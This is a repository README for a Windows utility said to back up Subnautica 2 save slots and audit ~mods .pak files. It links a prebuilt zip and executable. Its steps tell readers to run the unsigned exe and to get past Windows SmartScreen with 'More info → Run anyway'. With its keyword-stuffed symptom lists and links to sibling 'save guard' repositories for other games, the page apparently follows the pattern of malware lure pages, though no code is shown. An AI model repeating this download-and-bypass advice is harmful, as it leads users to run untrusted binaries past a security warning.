<p align="center">
  <img src="https://i.postimg.cc/6qkj4s26/banner.png" alt="Subnautica 2 Co-op Save Sentinel — Early Access World Backups & UE5 ~mods Checks" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Co-op%20Save%20%26%20Mod%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-subnautica2--save--guard--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Subnautica 2 Co-op Save Sentinel — Early Access World Backups & UE5 ~mods Checks

**Subnautica 2 world save disappearing after an Early Access update? Co-op host progress out of sync, or UE5 crashing on launch with ~mods installed? Protect your SaveGames slots before launching again.**

Subnautica 2 Co-op Save Sentinel focuses on Unknown Worlds' Unreal Engine 5 save structure on Windows: **single-player and co-op host world slots live inside `%LOCALAPPDATA%\Subnautica2\Saved\SaveGames`**, while community `.pak` modifications reside separately in `Subnautica2\Content\Paks\~mods`.

This project is aimed at **Subnautica 2 on Windows PC (Steam Early Access)**. It covers `%LOCALAPPDATA%\Subnautica2\Saved\SaveGames` backups, zero-byte save detection, Steam Cloud conflict precautions, and `~mods` isolation—not editing `.sav` files.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| World save slot vanishes after Early Access patch | Interrupted save write or Steam Cloud sync conflict | Back up `%LOCALAPPDATA%\Subnautica2\Saved\SaveGames` before relaunching |
| Co-op lobby fails to load modded world | Mismatched `.pak` files in `~mods` between host and clients | Compare `Subnautica2\Content\Paks\~mods` across co-op players |
| UE5 'Fatal error' on boot with `~mods` active | Outdated `.pak` override incompatible with latest EA build | Move `.pak` files out of `Content\Paks\~mods` and verify files |
| DX12 shader hitching in deep biomes | Driver update cleared PSOs or low free space on `C:` | Verify `C:` disk space and GPU driver shader cache settings |

## Download for Windows

[**Download Subnautica2SaveGuard.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/Subnautica2SaveGuard.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `Subnautica2SaveGuard.exe`? (Automatic checks in ~2 seconds)

- Locates `%LOCALAPPDATA%\Subnautica2\Saved\SaveGames\<SteamID64>` and lists all `slot*` worlds.
- Checks file sizes and timestamps inside each save slot and flags `0 KB` files.
- Audits `Subnautica2\Content\Paks\~mods` for outdated `.pak` mods after Early Access patches.
- Checks drive `C:` free space for Unreal Engine 5 shader compilation.

### Sample Diagnostic Output

```text
[Subnautica2SaveGuard] Scanning Subnautica 2 SaveGames & ~mods...
[OK]   Saved Directory  : C:\Users\Player\AppData\Local\Subnautica2\Saved
[OK]   SaveGames        : SaveGames\76561198041299104\slot0000 (6 files, 14.2 MB)
[INFO] Content\Paks\~mods: 2 .pak files detected
[OK]   System Drive C:  : 51.4 GB free
```

The release ZIP is named `Subnautica2SaveGuard.zip`; the Windows executable inside is named `Subnautica2SaveGuard.exe`.

1. Close Subnautica 2 before moving or checking game files.
2. Click **Download Subnautica2SaveGuard.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `Subnautica2SaveGuard.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Subnautica 2 and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Windows Steam installation of Subnautica 2, and access to `%LOCALAPPDATA%\Subnautica2`.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `Subnautica2SaveGuard.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### World save slot vanishes or reverts after an Early Access hotfix

Frequent Early Access patches update world serialization formats. If a save write is interrupted or Steam Cloud syncs an older snapshot, copying `%LOCALAPPDATA%\Subnautica2\Saved\SaveGames` immediately prevents overwriting surviving files.

### Co-op multiplayer lobby fails to load modded world

In co-op sessions, mismatched `.pak` files between host and joining players cause connection drops or infinite loading screens.

### UE5 'Fatal error' on startup after an update with `~mods`

Blueprint or UI `.pak` mods placed inside `Subnautica2\Content\Paks\~mods` often break when Early Access builds update core UE5 assets.

### Underwater shader compilation hitching on DirectX 12

Driver updates or low free space on drive `C:` can cause brief frame drops when entering new deep-sea biomes.

## Where Subnautica 2 files normally belong

On Windows Steam setups, world save slots and UE5 configs live in `%LOCALAPPDATA%\Subnautica2\Saved`:

```text
%LOCALAPPDATA%\Subnautica2\Saved\
```

Inside that structure, key files and subdirectories typically look like this:

```text
%LOCALAPPDATA%\Subnautica2\Saved\
├── Config\
│   └── Windows\
│       └── GameUserSettings.ini
└── SaveGames\
    └── <SteamID64>\
        └── slot0000\
```

Community `.pak` mods belong in `steamapps\common\Subnautica 2\Subnautica2\Content\Paks\~mods\`.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Exit Subnautica 2 completely.** Wait for `Subnautica2-Win64-Shipping.exe` to close and Steam Cloud sync to finish.
2. **Back up `%LOCALAPPDATA%\Subnautica2\Saved\SaveGames`.** Copy every `slot*` directory to a dated folder in Documents before applying Early Access patches.
3. **Inspect save slot file sizes and timestamps.** Confirm `*.sav` and metadata files inside each slot folder are non-zero (`> 0 KB`).
4. **Isolate `~mods` `.pak` files after patches.** Temporarily move files out of `Subnautica2\Content\Paks\~mods` if the game crashes on startup.
5. **Match co-op host and client builds.** Ensure all players in a co-op session run the exact same Steam build ID and mod set.
6. **Verify installed files in Steam.** Run **Steam → Library → Subnautica 2 → Properties → Installed Files → Verify integrity of game files**.
7. **Restart Subnautica 2 and verify slot visibility.** Confirm your world appears in the Play menu before removing backups.

### Before moving any files

Never delete or overwrite a `slot*` directory during recovery tests until you have saved an untouched copy outside `%LOCALAPPDATA%`.

## What an effective diagnostic report should tell you

A clear audit locates **all save slots under `%LOCALAPPDATA%\Subnautica2\Saved\SaveGames`**, flags `0 KB` files, and lists active `.pak` overrides in `Content\Paks\~mods`.

## FAQ

**Where are Subnautica 2 save files stored on Windows?**

They are stored in `%LOCALAPPDATA%\Subnautica2\Saved\SaveGames\<SteamID64>\`.

**How do I back up a Subnautica 2 co-op world?**

Exit the game completely and copy the entire `SaveGames` directory to a dated folder in Documents.

**Where do Subnautica 2 PAK mods go?**

Place `.pak` files inside `steamapps\common\Subnautica 2\Subnautica2\Content\Paks\~mods\`.

**Why did Subnautica 2 crash right after an Early Access patch?**

Outdated `.pak` mods in `~mods` are the most common cause; move them out temporarily to confirm.

**Does this tool edit save files or unlock blueprints?**

No. It performs read-only inspection of save folders and mod directories.

**Are any game files or mods bundled here?**

No copyrighted game binaries, save files, or third-party mods are included.

## Useful reading

- [Subnautica Official Website (Unknown Worlds)](https://unknownworlds.com/subnautica/)
- [Subnautica 2 on Steam](https://store.steampowered.com/app/1962700/Subnautica_2/)

## More Windows Game Diagnostic Tools

- [Enshrouded-WorldMigrationGuard](../Enshrouded-WorldMigrationGuard) — Enshrouded 1.0 world & dedicated server save backups
- [Palworld-WorldSaveSentinel](../Palworld-WorldSaveSentinel) — Palworld `Level.sav` & `backup\world` snapshot sentinel
- [MoonSweepers-SaveVault](../MoonSweepers-SaveVault) — Moon Sweepers `MoonSessions` co-op save backup utility
- [ManorLords-SaveModInspector](../ManorLords-SaveModInspector) — Manor Lords UE5 `~mods` isolation & save backup check

*Independent community project. Not affiliated with Unknown Worlds Entertainment, KRAFTON, Valve, or Steam. All trademarks belong to their respective owners.*
